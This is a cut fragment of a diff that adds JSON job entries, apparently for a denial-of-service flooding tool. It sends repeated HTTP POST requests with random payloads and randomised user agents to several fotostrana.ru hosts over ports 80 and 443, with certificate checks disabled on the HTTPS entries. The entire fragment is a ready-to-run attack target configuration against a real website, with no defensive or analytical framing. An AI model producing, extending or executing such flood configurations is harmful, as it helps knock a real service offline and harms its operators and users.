+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "https://s.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "s.fotostrana.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://s.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://s.fotostrana.ru",
+                                "Referer": "https://s.fotostrana.ru",
+                                "X-Forwarded-Host": "s.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "https://uc.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "uc.fotostrana.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://uc.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://uc.fotostrana.ru",
+                                "Referer": "https://uc.fotostrana.ru",
+                                "X-Forwarded-Host": "uc.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "http://fsm.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "fsm.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://fsm.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://fsm.fotostrana.ru",
+                                "Referer": "http://fsm.fotostrana.ru",
+                                "X-Forwarded-Host": "fsm.fotostrana.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 18,
+            "name": "http://s.fotostrana.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "s.fotostrana.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://s.fotostrana.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://s.fotostrana.ru",
+                                "Referer": "http://s.fotostrana.ru",
+                                "X-Forwarded-Host": "s.fotostrana.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
